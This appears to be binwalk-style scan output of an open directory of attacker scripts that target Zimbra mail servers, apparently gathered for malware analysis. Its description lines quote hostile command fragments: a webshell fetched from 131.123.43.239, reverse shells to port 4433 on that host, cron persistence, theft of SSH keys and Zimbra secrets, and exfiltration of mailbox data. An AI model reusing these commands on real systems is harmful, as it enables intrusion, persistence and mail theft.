+726           0x2D6           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | wc -l
+1127          0x467           Unix path: /opt/zimbra/log/.qq3m ]; then touch /opt/zimbra/log/.qq3m 2>/dev/null
+1835          0x72B           Unix path: /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
+1921          0x781           Unix path: /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev
+2341          0x925           Unix path: /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
+2448          0x990           Unix path: /opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/mb.sh
+MD5 Checksum:  e5648beac6bd962ae905051ad18c36a5
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/melinstall.sh
+MD5 Checksum:  6c2904b2ace056f75e195ae186524d69
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+337           0x151           Unix path: /opt/zimbra/jetty_base/webapps/zimbra/sh.jsp http://131.123.43.239:8123/x.jsp
+490           0x1EA           Unix path: /opt/zimbra/log/.mb.sh 2>/dev/null
+590           0x24E           Unix path: /opt/zimbra/log/.mb.sh >/dev/null 2>&1") | crontab - 2>/dev/null
+715           0x2CB           Unix path: /opt/zimbra/jetty_base/webapps/zimbra/sh.jsp >> /tmp/.ir 2>&1
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/melx2.sh
+MD5 Checksum:  91564b58954bada91f159483b6bd1c09
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+423           0x1A7           Unix path: /etc/ssh/sshd_config /root/.ssh/authorized_keys /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.ssh/known_hosts /home/user/.ssh/a
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/melx.sh
+MD5 Checksum:  4e6599c642457ae14993557d184ae59b
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+461           0x1CD           Unix path: /opt/zimbra/backup 2>&1 | head; ls -la /opt/zimbra/backup/sessions 2>/dev/null | head
+674           0x2A2           Unix path: /opt/zimbra/.ssh /etc/ssh -maxdepth 3 \( -name 'id_*' -o -name '*.pem' -o -name 'authorized_keys' \) 2>/dev/null | head -20
+1205          0x4B5           Unix path: /dev/tcp/10.61.10.$i/22" 2>/dev/null && echo "SSH-OPEN 10.61.10.$i" >> $O; done
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/mhook.sh
+MD5 Checksum:  c328ed5dd20f6ccd5580cb9ce4e9c91f
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+318           0x13E           Unix path: /opt/zimbra/log
+1072          0x430           Unix path: /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
+1158          0x486           Unix path: /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev
+1578          0x62A           Unix path: /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
+1685          0x695           Unix path: /opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/
+2340          0x924           Unix path: /sys/class/net/*/speed 2>&1
+2444          0x98C           Unix path: /opt/zimbra/store/0/* 2>/dev/null | sort -n | tail -25
+3293          0xCDD           Unix path: /opt/zimbra/store" 2>/dev/null
+9009          0x2331          Executable script, shebang: "/bin/bash' && break"
+9349          0x2485          Executable script, shebang: "/bin/bash' && break"
+9692          0x25DC          Executable script, shebang: "/bin/bash' && break"
+10042         0x273A          Executable script, shebang: "/usr/bin/env' && break"
+10044         0x273C          Unix path: /usr/bin/env' && break
+10621         0x297D          Executable script, shebang: "/bin/bash" && break"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/miniscmr.py
+MD5 Checksum:  8aa01f702630dce6865fa0b4855e1727
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/moreweb.sh
+MD5 Checksum:  1e8a1a297fceefcb9902ed1aa6b37989
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+324           0x144           Unix path: /opt/zimbra/common/bin/curl
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/mqdq.sh
+MD5 Checksum:  484504e4f4b37d9db72c8857f72f7a16
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/mq.sh
+MD5 Checksum:  4015993f2c9378eed9bd33f72798e50c
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+416           0x1A0           Unix path: /opt/zimbra/log
+578           0x242           Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+710           0x2C6           Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+1072          0x430           Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+1251          0x4E3           Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/mscmr2.py
+MD5 Checksum:  cca6dfc0a6f15fff54c037d253026022
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/mspb.sh
+MD5 Checksum:  2ea478ed04856676e0088b00e7cced4c
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+360           0x168           Unix path: /dev/tcp/131.123.43.239/4433 0>&1; sleep 15; done' >/dev/null 2>&1 &
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/mspinstall.sh
+MD5 Checksum:  8ca3d2e80d158d9fb25de90d94054030
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/mtik.py
+MD5 Checksum:  534395510a98868e5eb350fdeb0dfcfc
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/ndrun2.sh
+MD5 Checksum:  923916f85867fd93e725f4250fcc0295
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/ndrun3.sh
+MD5 Checksum:  a334ea3a6fea817fb79962c71f32a4b1
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/ndrun4.sh
+MD5 Checksum:  905520d7c97286aa41df2d98fe53a5df
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/ndrun5.sh
+MD5 Checksum:  8639d3e36305fbe6f3306e52223a15f0
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/nds3.b64
+MD5 Checksum:  3bfda3d458ab3425b5858671619a5c7e
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/nds3.py
+MD5 Checksum:  7802519208e29536ad4d18947b60a2da
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/ndstage.py
+MD5 Checksum:  7802519208e29536ad4d18947b60a2da
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/usr/bin/env python3"
+2             0x2             Unix path: /usr/bin/env python3
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/ntrun4.sh
+MD5 Checksum:  f1f4dcb222f8b537418cbcc8d0569ca4
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/ntrun5.sh
+MD5 Checksum:  65205448e1bf8bc16ba6db395fddbe68
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+
+
+Scan Time:     2026-09-29 18:40:12
+Target File:   /home/derek/Opendir/output.txt
+MD5 Checksum:  b3882074e24d15fc1de78c7cfe687ea0
+Signatures:    436
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             Executable script, shebang: "/bin/bash"
+1734          0x6C6           Executable script, shebang: "/usr/bin/env python3"
+1736          0x6C8           Unix path: /usr/bin/env python3
+10849         0x2A61          Executable script, shebang: "/bin/bash"
+28140         0x6DEC          Executable script, shebang: "/bin/bash"
+28748         0x704C          Executable script, shebang: "/bin/bash"
+29357         0x72AD          Executable script, shebang: "/bin/bash"
+29965         0x750D          Executable script, shebang: "/bin/bash"
+30573         0x776D          Executable script, shebang: "/bin/bash"
+31184         0x79D0          Executable script, shebang: "/bin/bash"
+31809         0x7C41          Executable script, shebang: "/usr/bin/env python3"
+31811         0x7C43          Unix path: /usr/bin/env python3
+34045         0x84FD          Executable script, shebang: "/usr/bin/env python3"
+34047         0x84FF          Unix path: /usr/bin/env python3
+37167         0x912F          Executable script, shebang: "/bin/bash"
+37559         0x92B7          Unix path: /opt/zimbra/bin
+38014         0x947E          Unix path: /opt/zimbra/conf/localconfig.xml ] && base64 -w0 /opt/zimbra/conf/localconfig.xml | post "nkr_lc2"
+38118         0x94E6          Unix path: /opt/zimbra/conf/nginx/includes/nginx.conf.mail ] && base64 -w0 /opt/zimbra/conf/nginx/includes/nginx.conf.mail | post "nkr_ng"
+38251         0x956B          Unix path: /opt/zimbra/postfix/conf/master.cf ] && head -60 /opt/zimbra/postfix/conf/master.cf | post "nkr_mcf"
+40041         0x9C69          Executable script, shebang: "/bin/bash"
+40374         0x9DB6          Unix path: /opt/zimbra/bin
+41364         0xA194          Executable script, shebang: "/bin/bash"
+41756         0xA31C          Unix path: /opt/zimbra/bin
+42211         0xA4E3          Unix path: /opt/zimbra/conf/localconfig.xml ] && base64 -w0 /opt/zimbra/conf/localconfig.xml | post "spz_lc2"
+42315         0xA54B          Unix path: /opt/zimbra/conf/nginx/includes/nginx.conf.mail ] && base64 -w0 /opt/zimbra/conf/nginx/includes/nginx.conf.mail | post "spz_ng"
+42448         0xA5D0          Unix path: /opt/zimbra/postfix/conf/master.cf ] && head -60 /opt/zimbra/postfix/conf/master.cf | post "spz_mcf"
+44238         0xACCE          Executable script, shebang: "/bin/bash"
+45297         0xB0F1          Executable script, shebang: "/bin/bash"
+46578         0xB5F2          Executable script, shebang: "/bin/bash"
+46902         0xB736          Unix path: /opt/zimbra/common/bin/curl
+47809         0xBAC1          Executable script, shebang: "/bin/bash"
+48186         0xBC3A          Unix path: /opt/zimbra/common/bin/curl
+49245         0xC05D          Executable script, shebang: "/bin/bash"
+49993         0xC349          Executable script, shebang: "/bin/bash"
+50317         0xC48D          Unix path: /opt/zimbra/log
+50750         0xC63E          Executable script, shebang: "/bin/bash"
+51074         0xC782          Unix path: /opt/zimbra/log
+51588         0xC984          Executable script, shebang: "/bin/bash"
+52363         0xCC8B          Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+52588         0xCD6C          Unix path: /opt/zimbra/log/.map ] && wc -l < /opt/zimbra/log/.map 2>/dev/null || echo NO )
+52978         0xCEF2          Executable script, shebang: "/bin/bash"
+54136         0xD378          Unix path: /opt/zimbra/log
+54297         0xD419          Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+54429         0xD49D          Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+54791         0xD607          Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+54970         0xD6BA          Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+56702         0xDD7E          Unix path: /opt/zimbra/store/0 2>/dev/null | head -5; ls /opt/zimbra/store/0 2>/dev/null | wc -l
+56804         0xDDE4          Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | wc -l
+57206         0xDF76          Unix path: /opt/zimbra/log/.qq3m ]; then touch /opt/zimbra/log/.qq3m 2>/dev/null
+57910         0xE236          Unix path: /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
+57996         0xE28C          Unix path: /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev
+58416         0xE430          Unix path: /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
+58523         0xE49B          Unix path: /opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/
+60387         0xEBE3          Executable script, shebang: "/bin/bash"
+61475         0xF023          Executable script, shebang: "/usr/bin/env python3"
+61477         0xF025          Unix path: /usr/bin/env python3
+63537         0xF831          Executable script, shebang: "/bin/bash"
+64174         0xFAAE          Executable script, shebang: "/usr/bin/env python3"
+64176         0xFAB0          Unix path: /usr/bin/env python3
+67051         0x105EB         Executable script, shebang: "/bin/bash"
+67519         0x107BF         Unix path: /opt/zimbra/common/sbin/sendmail${IFS}admin@pl.dbr.gov.ua'
+67662         0x1084E         Unix path: /opt/zimbra/common/sbin/sendmail${IFS}admin@pl.dbr.gov.ua'
+68028         0x109BC         Executable script, shebang: "/usr/bin/env python3"
+68030         0x109BE         Unix path: /usr/bin/env python3
+70734         0x1144E         Executable script, shebang: "/usr/bin/env python3"
+70736         0x11450         Unix path: /usr/bin/env python3
+73983         0x120FF         Executable script, shebang: "/bin/bash"
+74962         0x124D2         Unix path: /var/lib/postfix -type f 2>/dev/null | head -60; echo ==SAMPLES==; find / -xdev \( -iname "*.eml" -o -iname "*.msg" -o -iname "*
+75512         0x126F8         PEM RSA private key
+434662        0x6A1E6         HTML document header
+439564        0x6B50C         HTML document footer
+439572        0x6B514         Executable script, shebang: "/bin/bash"
+487628        0x770CC         Executable script, shebang: "/bin/bash"
+488802        0x77562         Executable script, shebang: "/bin/bash"
+489955        0x779E3         Unix path: /opt/zimbra/log
+490117        0x77A85         Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+490249        0x77B09         Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+490610        0x77C72         Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+490789        0x77D25         Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+491897        0x78179         Executable script, shebang: "/bin/bash"
+492715        0x784AB         Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+493227        0x786AB         Executable script, shebang: "/bin/bash"
+493973        0x78995         Executable script, shebang: "/bin/bash"
+494297        0x78AD9         Unix path: /opt/zimbra/log
+495138        0x78E22         Unix path: /opt/zimbra/log
+495299        0x78EC3         Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+495431        0x78F47         Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+495792        0x790B0         Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+495971        0x79163         Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+497701        0x79825         Unix path: /opt/zimbra/store/0 2>/dev/null | head -5; ls /opt/zimbra/store/0 2>/dev/null | wc -l
+497803        0x7988B         Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | wc -l
+498204        0x79A1C         Unix path: /opt/zimbra/log/.qq3m ]; then touch /opt/zimbra/log/.qq3m 2>/dev/null
+498908        0x79CDC         Unix path: /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
+498994        0x79D32         Unix path: /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev
+499414        0x79ED6         Unix path: /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
+499521        0x79F41         Unix path: /opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/
+500062        0x7A15E         Executable script, shebang: "/bin/bash"
+500399        0x7A2AF         Unix path: /opt/zimbra/jetty_base/webapps/zimbra/sh.jsp http://131.123.43.239:8123/x.jsp
+500552        0x7A348         Unix path: /opt/zimbra/log/.kb.sh 2>/dev/null
+500652        0x7A3AC         Unix path: /opt/zimbra/log/.kb.sh >/dev/null 2>&1") | crontab - 2>/dev/null
+500777        0x7A429         Unix path: /opt/zimbra/jetty_base/webapps/zimbra/sh.jsp >> /tmp/.ir 2>&1
+501174        0x7A5B6         Executable script, shebang: "/bin/bash"
+501498        0x7A6FA         Unix path: /opt/zimbra/common/bin/curl
+502762        0x7ABEA         Executable script, shebang: "/usr/bin/env python3"
+502764        0x7ABEC         Unix path: /usr/bin/env python3
+505443        0x7B663         Executable script, shebang: "/usr/bin/env python3"
+505445        0x7B665         Unix path: /usr/bin/env python3
+507452        0x7BE3C         Executable script, shebang: "/usr/bin/env python3"
+507454        0x7BE3E         Unix path: /usr/bin/env python3
+510791        0x7CB47         Executable script, shebang: "/usr/bin/env python3"
+510793        0x7CB49         Unix path: /usr/bin/env python3
+513458        0x7D5B2         Executable script, shebang: "/bin/bash"
+514401        0x7D961         Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+515323        0x7DCFB         Unix path: /opt/zimbra/log
+515484        0x7DD9C         Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+515616        0x7DE20         Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+515977        0x7DF89         Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+516156        0x7E03C         Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+517622        0x7E5F6         Unix path: /opt/zimbra/bin
+517854        0x7E6DE         Unix path: /opt/zimbra/store/0 2>/dev/null | wc -l
+517920        0x7E720         Unix path: /opt/zimbra/.ssh 2>/dev/null; head -40 /opt/zimbra/.ssh/id_rsa* 2>/dev/null
+519097        0x7EBB9         Unix path: /opt/zimbra/store/0 2>/dev/null | head -5; ls /opt/zimbra/store/0 2>/dev/null | wc -l
+519199        0x7EC1F         Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | wc -l
+519600        0x7EDB0         Unix path: /opt/zimbra/log/.qq3m ]; then touch /opt/zimbra/log/.qq3m 2>/dev/null
+520304        0x7F070         Unix path: /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
+520390        0x7F0C6         Unix path: /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev
+520810        0x7F26A         Unix path: /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
+520917        0x7F2D5         Unix path: /opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/
+521458        0x7F4F2         Executable script, shebang: "/bin/bash"
+522069        0x7F755         Executable script, shebang: "/bin/bash"
+522406        0x7F8A6         Unix path: /opt/zimbra/jetty_base/webapps/zimbra/sh.jsp http://131.123.43.239:8123/x.jsp
+522559        0x7F93F         Unix path: /opt/zimbra/log/.mb.sh 2>/dev/null
+522659        0x7F9A3         Unix path: /opt/zimbra/log/.mb.sh >/dev/null 2>&1") | crontab - 2>/dev/null
+522784        0x7FA20         Unix path: /opt/zimbra/jetty_base/webapps/zimbra/sh.jsp >> /tmp/.ir 2>&1
+523605        0x7FD55         Unix path: /etc/ssh/sshd_config /root/.ssh/authorized_keys /root/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.ssh/known_hosts /home/user/.ssh/a
+524802        0x80202         Unix path: /opt/zimbra/backup 2>&1 | head; ls -la /opt/zimbra/backup/sessions 2>/dev/null | head
+525015        0x802D7         Unix path: /opt/zimbra/.ssh /etc/ssh -maxdepth 3 \( -name 'id_*' -o -name '*.pem' -o -name 'authorized_keys' \) 2>/dev/null | head -20
+525546        0x804EA         Unix path: /dev/tcp/10.61.10.$i/22" 2>/dev/null && echo "SSH-OPEN 10.61.10.$i" >> $O; done
+526224        0x80790         Unix path: /opt/zimbra/log
+526974        0x80A7E         Unix path: /var/spool/cron 2>/dev/null; cat /etc/cron.d/* 2>/dev/null
+527060        0x80AD4         Unix path: /opt/zimbra/.ssh 2>/dev/null; cat /opt/zimbra/.ssh/zimbra_identity* /opt/zimbra/.ssh/authorized_keys /opt/zimbra/.ssh/id* 2>/dev
+527480        0x80C78         Unix path: /opt/zimbra/.bash_history /home/*/.bash_history 2>/dev/null | tail -400
+527587        0x80CE3         Unix path: /opt/zimbra/bin/zmlocalconfig -s' 2>/dev/null || sudo -u zimbra /opt/zimbra/bin/zmlocalconfig -s 2>/dev/null || /opt/zimbra/bin/
+528235        0x80F6B         Unix path: /sys/class/net/*/speed 2>&1
+528339        0x80FD3         Unix path: /opt/zimbra/store/0/* 2>/dev/null | sort -n | tail -25
+529179        0x8131B         Unix path: /opt/zimbra/store" 2>/dev/null
+534802        0x82912         Executable script, shebang: "/bin/bash' && break"
+535139        0x82A63         Executable script, shebang: "/bin/bash' && break"
+535479        0x82BB7         Executable script, shebang: "/bin/bash' && break"
+535826        0x82D12         Executable script, shebang: "/usr/bin/env' && break"
+535828        0x82D14         Unix path: /usr/bin/env' && break
+536401        0x82F51         Executable script, shebang: "/bin/bash" && break"
+537515        0x833AB         Executable script, shebang: "/usr/bin/env python3"
+537517        0x833AD         Unix path: /usr/bin/env python3
+539888        0x83CF0         Executable script, shebang: "/bin/bash"
+540212        0x83E34         Unix path: /opt/zimbra/common/bin/curl
+541714        0x84412         Executable script, shebang: "/bin/bash"
+543108        0x84984         Unix path: /opt/zimbra/log
+543270        0x84A26         Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+543402        0x84AAA         Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+543764        0x84C14         Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+543943        0x84CC7         Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+545053        0x8511D         Executable script, shebang: "/usr/bin/env python3"
+545055        0x8511F         Unix path: /usr/bin/env python3
+547364        0x85A24         Executable script, shebang: "/bin/bash"
+547724        0x85B8C         Unix path: /dev/tcp/131.123.43.239/4433 0>&1; sleep 15; done' >/dev/null 2>&1 &
+547977        0x85C89         Executable script, shebang: "/bin/bash"
+548792        0x85FB8         Executable script, shebang: "/usr/bin/env python3"
+548794        0x85FBA         Unix path: /usr/bin/env python3
+551744        0x86B40         Executable script, shebang: "/bin/bash"
+552998        0x87026         Executable script, shebang: "/bin/bash"
+554270        0x8751E         Executable script, shebang: "/bin/bash"
+555634        0x87A72         Executable script, shebang: "/bin/bash"
+562079        0x8939F         Executable script, shebang: "/usr/bin/env python3"
+562081        0x893A1         Unix path: /usr/bin/env python3
+566428        0x8A49C         Executable script, shebang: "/usr/bin/env python3"
+566430        0x8A49E         Unix path: /usr/bin/env python3
+570777        0x8B599         Executable script, shebang: "/bin/bash"
+572407        0x8BBF7         Executable script, shebang: "/bin/bash"
+578265        0x8D2D9         Executable script, shebang: "/bin/bash"
+579079        0x8D607         Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+579591        0x8D807         Executable script, shebang: "/bin/bash"
+580415        0x8DB3F         Unix path: /dev/tcp/131.123.43.239/4433 0>&1" &); fi
+582631        0x8E3E7         Executable script, shebang: "/usr/bin/env python3"
+582633        0x8E3E9         Unix path: /usr/bin/env python3
+584585        0x8EB89         Executable script, shebang: "/usr/bin/env python3"
+584587        0x8EB8B         Unix path: /usr/bin/env python3
+587506        0x8F6F2         Unix path: /opt/zimbra/log
+587667        0x8F793         Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+587799        0x8F817         Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+588161        0x8F981         Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+588340        0x8FA34         Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+589865        0x90029         Unix path: /opt/zimbra/log
+590026        0x900CA         Unix path: /opt/zimbra/bin/zmprov -l gaa 2>/dev/null | grep -v -x -f <(awk "{print \$1}" $L/.map) > /tmp/.todo
+590158        0x9014E         Unix path: /opt/zimbra/bin/zmprov gmi "$a" 2>/dev/null | awk "/mailboxId/{print \$2}")
+590520        0x902B8         Unix path: /opt/zimbra/store/0/$id" ] || { echo "$id" >> $L/.doj; return 0; }
+590699        0x9036B         Unix path: /opt/zimbra/store/0 "$id" 2>/dev/null | $GZ -1 | split -b 150m - /tmp/C_${id}_ 2>/dev/null
+591809        0x907C1         Executable script, shebang: "/bin/bash"
+592779        0x90B8B         Executable script, shebang: "/usr/bin/env python3"
+592781        0x90B8D         Unix path: /usr/bin/env python3
+623138        0x98222         Executable script, shebang: "/usr/bin/env python"
+623140        0x98224         Unix path: /usr/bin/env python
+623179        0x9824B         Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
+644098        0x9D402         Executable script, shebang: "/usr/bin/env python"
+644100        0x9D404         Unix path: /usr/bin/env python
+644139        0x9D42B         Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
+665058        0xA25E2         Executable script, shebang: "/usr/bin/env python"
+665060        0xA25E4         Unix path: /usr/bin/env python
+665099        0xA260B         Copyright string: "Copyright 2018 SecureAuth Corporation. All rights reserved."
